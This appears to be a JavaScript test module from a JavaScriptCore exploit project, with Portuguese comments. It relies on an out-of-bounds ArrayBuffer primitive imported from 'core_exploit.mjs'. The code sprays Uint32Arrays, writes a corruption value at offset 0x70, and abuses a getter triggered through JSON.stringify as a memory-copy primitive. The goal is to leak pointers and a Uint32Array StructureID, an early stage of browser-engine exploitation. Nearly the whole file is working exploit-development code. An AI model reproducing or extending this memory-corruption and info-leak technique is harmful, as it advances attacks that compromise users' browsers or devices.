// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.14"; // Versão atualizada

const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_14";
const PLANT_OFFSET_0x6C = 0x6C; // Offset onde plantamos o valor que influencia a "mágica"
const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;
const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x180;

let getter_copy_called_flag_v10_14 = false;

let EXPECTED_UINT32ARRAY_STRUCTURE_ID = null;
const PLACEHOLDER_SID_UINT32ARRAY = 0xBADBAD00 | 42; // Novo placeholder


// ============================================================
// PRIMITIVA DE CÓPIA DE MEMÓRIA (readFromOOBOffsetViaCopy_v10_14)
// ============================================================
async function readFromOOBOffsetViaCopy_v10_14(dword_source_offset_to_read_from) {
    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy_v10_14`;
    getter_copy_called_flag_v10_14 = false;

    if (!oob_array_buffer_real || !oob_dataview_real) {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) return new AdvancedInt64(0xDEADDEAD, 0xBADBAD);
    }
    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);

    // Plantar o dword_source_offset_to_read_from como a parte baixa do QWORD em PLANT_OFFSET_0x6C.
    const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0);
    oob_write_absolute(PLANT_OFFSET_0x6C, value_to_plant_at_0x6c, 8); // USA A CONSTANTE CORRETA

    const getterObjectForCopy = {
        get [GETTER_PROPERTY_NAME_COPY]() {
            getter_copy_called_flag_v10_14 = true;
            try {
                const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
                const effective_read_offset = qword_at_0x68.high();

                if (effective_read_offset === dword_source_offset_to_read_from) {
                    if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
                        const data_read = oob_read_absolute(effective_read_offset, 8);
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
                    } else {
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);
                    }
                } else {
                     logS3(`  [GETTER ${GETTER_PROPERTY_NAME_COPY}] ERRO MÁGICA: effective_read_offset (${toHex(effective_read_offset)}) != dword_source_offset (${toHex(dword_source_offset_to_read_from)})! Qword@0x68 era ${qword_at_0x68.toString(true)}`, "critical", FNAME_PRIMITIVE);
                    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBAD68BAD, 0xBAD68BAD), 8);
                }
            } catch (e_getter) {
                logS3(`  [GETTER ${GETTER_PROPERTY_NAME_COPY}] Erro interno: ${e_getter.message}`, "error", FNAME_PRIMITIVE);
                try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){}
            }
            return "getter_copy_v10_14_done";
        }
    };

    oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
    await PAUSE_S3(10);

    try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }

    if (!getter_copy_called_flag_v10_14) { return null; }
    return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
}

// ============================================================
// FUNÇÃO PARA LER StructureID USANDO A PRIMITIVA DE CÓPIA
// ============================================================
async function getStructureIDFromCopiedQWORD() { // Renomeada para clareza, pois lê do destino da cópia
    const copied_qword = oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
    if (copied_qword &&
        !(copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xDEADDEAD) &&
        !(copied_qword.low() === 0xBAD68BAD && copied_qword.high() === 0xBAD68BAD) ) {
        return copied_qword.low();
    }
    return null;
}

// ============================================================
// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.14)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.investigateCorruptionLeak_v10.14`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Investigando Vazamento de Ponteiro para 0x6C/0x68 via Corrupção ---`, "test", FNAME_CURRENT_TEST);

    let sprayedU32Arrays = [];

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        // 1. Limpar offsets de interesse e pulverizar objetos
        logS3("PASSO 1: Limpando offsets de interesse e pulverizando Uint32Arrays...", "info", FNAME_CURRENT_TEST);
        oob_write_absolute(PLANT_OFFSET_0x6C, new AdvancedInt64(0xCAFEF00D, 0xCAFEF00D), 8); // Limpa 0x6C com um padrão
        oob_write_absolute(INTERMEDIATE_PTR_OFFSET_0x68, new AdvancedInt64(0xBABEBEEF, 0xBABEBEEF), 8); // Limpa 0x68 com um padrão
        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8); // Limpa destino da cópia

        const NUM_U32_SPRAY = 200;
        for (let i = 0; i < NUM_U32_SPRAY; i++) {
            sprayedU32Arrays.push(new Uint32Array(8 + (i % 3)));
        }
        logS3(`  ${sprayedU32Arrays.length} Uint32Arrays pulverizados.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(300);

        // 2. Acionar a primitiva de cópia.
        //    A corrupção em 0x70 é acionada DENTRO de readFromOOBOffsetViaCopy_v10_14.
        //    Essa corrupção é o que PODE fazer com que um ponteiro vaze para 0x6C.low,
        //    que então se torna 0x68.high, que é o offset de leitura da primitiva de cópia.
        //    Não passamos um offset fonte para readFromOOBOffsetViaCopy_v10_14 porque
        //    o valor que plantamos em 0x6C (primeiro arg de AdvancedInt64) é o que queremos
        //    que se torne o 0x68.high().
        //    A questão é: o que a corrupção em 0x70 faz com o valor original em 0x6C.low?

        logS3("PASSO 2: Acionando primitiva de cópia...", "info", FNAME_CURRENT_TEST);
        logS3("   Objetivo: Ver se a corrupção em 0x70 vaza um ponteiro útil para 0x6C.low,", "info", FNAME_CURRENT_TEST);
        logS3("   que então se torna 0x68.high, que o getter usa como offset de leitura.", "info", FNAME_CURRENT_TEST);

        // Para este teste, vamos ver o que é lido se não plantarmos nada significativo em 0x6C antes da corrupção.
        // A primitiva readFromOOBOffsetViaCopy_v10_14 plantará seu argumento (dword_source_offset_to_read_from) em 0x6C.low.
        // Vamos passar um offset baixo e conhecido para que, se a corrupção NÃO vazar nada para 0x6C.low,
        // saibamos de onde a leitura está vindo.
        const offset_para_teste_primitiva = 0x250; // Um offset dentro do buffer OOB
        oob_write_absolute(offset_para_teste_primitiva, new AdvancedInt64(0xABCDABCD, 0x12341234), 8); // Escreve um valor conhecido lá
        logS3(`   Valor de teste ${toHex(0x12341234ABCDABCDn)} escrito em ${toHex(offset_para_teste_primitiva)}.`, "info", FNAME_CURRENT_TEST);

        await readFromOOBOffsetViaCopy_v10_14(offset_para_teste_primitiva);

        // 3. Analisar o que foi copiado e os valores em 0x6C e 0x68
        const val_at_0x6C_post_corruption = oob_read_absolute(PLANT_OFFSET_0x6C, 8);
        const val_at_0x68_post_corruption = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
        const data_copied_to_dest = oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);

        logS3("PASSO 3: Analisando resultados...", "info", FNAME_CURRENT_TEST);
        logS3(`  Valor em 0x6C (PLANT_OFFSET_0x6C) APÓS corrupção: ${val_at_0x6C_post_corruption.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        logS3(`    (Esperamos que .low() seja ${toHex(offset_para_teste_primitiva)} se não houve vazamento para 0x6C pela corrupção em 0x70)`, "info", FNAME_CURRENT_TEST);
        logS3(`  Valor em 0x68 (INTERMEDIATE_PTR_OFFSET_0x68) APÓS corrupção: ${val_at_0x68_post_corruption.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        logS3(`    (Esperamos que .high() seja ${toHex(offset_para_teste_primitiva)} se não houve vazamento)`, "info", FNAME_CURRENT_TEST);
        logS3(`  Dados copiados para ${toHex(TARGET_COPY_DEST_OFFSET_IN_OOB)}: ${data_copied_to_dest.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        logS3(`    (Esperamos que seja igual a oob_buffer[${toHex(offset_para_teste_primitiva)}] se não houve vazamento)`, "info", FNAME_CURRENT_TEST);


        let effective_read_offset_used_by_getter = val_at_0x68_post_corruption.high();
        logS3(`  Offset efetivo de leitura que FOI USADO pelo getter (de 0x68.high): ${toHex(effective_read_offset_used_by_getter)}`, "info", FNAME_CURRENT_TEST);

        if (data_copied_to_dest.equals(new AdvancedInt64(0xABCDABCD, 0x12341234))) {
            logS3("    !!!! VALIDAÇÃO: Primitiva de cópia leu do offset de teste (${toHex(offset_para_teste_primitiva)}) como esperado. !!!!", "good", FNAME_CURRENT_TEST);
            logS3("       Isso significa que a corrupção em 0x70 NÃO alterou 0x6C.low para um ponteiro vazado desta vez.", "info", FNAME_CURRENT_TEST);
            document.title = "Cópia OK, Sem Leak em 0x6C";
        } else if (!data_copied_to_dest.isZero() && !(data_copied_to_dest.low() === 0xBADBAD && data_copied_to_dest.high() === 0xDEADDEAD) && !(data_copied_to_dest.low() === 0xBAD68BAD && data_copied_to_dest.high() === 0xBAD68BAD) ) {
            logS3("    !!!! DADOS NÃO NULOS/ERRO FORAM COPIADOS, e DIFERENTES do valor de teste !!!!", "vuln", FNAME_CURRENT_TEST);
            logS3(`      Isso sugere que o effective_read_offset_used_by_getter (${toHex(effective_read_offset_used_by_getter)}) veio de um vazamento para 0x6C.low!`, "vuln", FNAME_CURRENT_TEST);
            document.title = `LEAK em ${toHex(effective_read_offset_used_by_getter)}?`;

            const potential_sid = data_copied_to_dest.low();
            logS3(`      StructureID potencial vazado (da cópia): ${toHex(potential_sid)}`, "leak", FNAME_CURRENT_TEST);
            if (potential_sid !== 0 && potential_sid !== 0xFFFFFFFF) {
                 EXPECTED_UINT32ARRAY_STRUCTURE_ID = potential_sid;
                 logS3(`        !!!! ATRIBUÍDO ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} a EXPECTED_UINT32ARRAY_STRUCTURE_ID !!!!`, "vuln", FNAME_CURRENT_TEST);
                 logS3("        >>>> VERIFIQUE SE ESTE É UM SID VÁLIDO E ATUALIZE A CONSTANTE NO TOPO DO ARQUIVO! <<<<", "critical", FNAME_CURRENT_TEST);
                 document.title = `SID VAZADO? ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`;
            }
        } else {
            logS3("    Dados copiados foram zero ou um valor de erro. Investigar o effective_read_offset.", "warn", FNAME_CURRENT_TEST);
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        sprayedU32Arrays = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
